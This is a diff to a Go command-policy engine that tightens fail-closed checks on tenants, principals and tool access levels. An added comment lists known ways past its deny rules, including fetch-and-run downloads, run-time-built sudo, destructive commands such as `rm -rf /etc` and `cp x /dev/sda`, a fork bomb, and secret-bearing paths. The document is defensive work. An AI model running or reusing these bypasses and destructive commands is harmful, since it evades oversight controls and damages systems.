@@ -13,6 +13,23 @@
 // written in endless ways and no list can catch them all; what a command can
 // change is decided by the unprivileged account it runs as on the target
 // (spec D6 and section 6).
+//
+// Known limitations, accepted for a guard rail (spec 5.3): a command word
+// built at run time (`$(echo sudo) id`, `x=$(curl U); eval "$x"`), options
+// that take a value before the command (`env -u X sudo id`, `telinit -t 5 0`,
+// `systemctl -H h reboot`), wrappers it does not know (`flock /tmp/l su`),
+// commands inside the script of `eval "..."`, other tools that do the same
+// harm (`systemctl start reboot.target`, `blkdiscard`, `cp x /dev/sda`,
+// `find / -delete`, `rm -rf /etc`), devices it does not list (`/dev/nbd0`,
+// LVM paths), a download saved and run later (`curl -o f U; sh f`), a fork
+// bomb written as `function f { f|f& }`, and on the path side custom key
+// names, `.envrc` and `/proc/*/cmdline`. Single- and double-quoted text is
+// skipped when looking for a command start, except for a $( or backtick
+// inside double quotes.
+//
+// Fail closed: a principal without a tenant or a kind is not_found, a tool
+// that declares no level (AccessNone) or an undefined one is access_denied,
+// and NewEngine refuses a tenant with an empty id.
 package policy
 
 import (
@@ -113,16 +130,10 @@ func deny(code Code, rule string) Decision {
 	return Decision{Code: code, Rule: rule}
 }
 
-// operatorCommand is a compiled deny_commands entry.
-type operatorCommand struct {
-	name string
-	re   *regexp.Regexp
-}
-
 // tenantRules is what the engine keeps per tenant.
 type tenantRules struct {
 	maxCommandBytes int
-	commands        []operatorCommand
+	commands        []commandRule
 	paths           []pathRule
 }
 
@@ -142,6 +153,10 @@ func NewEngine(tenants []tenant.Tenant) (*Engine, error) {
 	var errs []error
 	for i := range tenants {
 		t := &tenants[i]
+		if t.ID == "" {
+			errs = append(errs, errors.New("a tenant has an empty id"))
+			continue
+		}
 		if _, dup := e.tenants[t.ID]; dup {
 			errs = append(errs, fmt.Errorf("tenant %q appears twice", t.ID))
 			continue
@@ -157,10 +172,10 @@ func NewEngine(tenants []tenant.Tenant) (*Engine, error) {
 				errs = append(errs, fmt.Errorf("tenant %q: deny_commands[%d]: %w", t.ID, j, err))
 				continue
 			}
-			r.commands = append(r.commands, operatorCommand{name: fmt.Sprintf("%s[%d]", operatorCommandPrefix, j), re: re})
+			r.commands = append(r.commands, commandRule{Name: fmt.Sprintf("%s[%d]", operatorCommandPrefix, j), Pattern: p, re: re})
 		}
 		for j, g := range t.Policy.DenyPaths {
-			if _, err := path.Match(g, ""); err != nil || g == "" {
+			if !validGlob(g) {
 				errs = append(errs, fmt.Errorf("tenant %q: deny_paths[%d]: not a valid glob", t.ID, j))
 				continue
 			}
@@ -179,14 +194,16 @@ func NewEngine(tenants []tenant.Tenant) (*Engine, error) {
 // of another tenant is treated exactly like a missing one.
 func (e *Engine) Decide(p tenant.Principal, srv *tenant.Server, tool Tool, args Args) Decision {
 	rules, ok := e.tenants[p.Tenant]
-	if !ok || srv == nil || srv.Tenant != p.Tenant {
+	if !ok || p.Tenant == "" || p.Kind == 0 || srv == nil || srv.Tenant != p.Tenant {
 		return deny(CodeNotFound, RuleServerNotFound)
 	}
 	required := tool.Requires
 	if tool.WritesFiles {
 		required = tenant.AccessFull
 	}
-	if !tenant.Permits(srv.Access, required) {
+	// A tool must declare at least look (a zero-value Tool is never
+	// allowed); Permits(required, look) says required is look or above.
+	if !tenant.Permits(required, tenant.AccessLook) || !tenant.Permits(srv.Access, required) {
 		return deny(CodeAccessDenied, RuleAccessLevel)
 	}
 	switch tool.Input {
@@ -216,7 +233,7 @@ func (r *tenantRules) checkCommand(cmd string) Decision {
 	}
 	for _, o := range r.commands {
 		if o.re.MatchString(c) {
-			return deny(CodePolicyDenied, o.name)
+			return deny(CodePolicyDenied, o.Name)
 		}
 	}
 	return allow
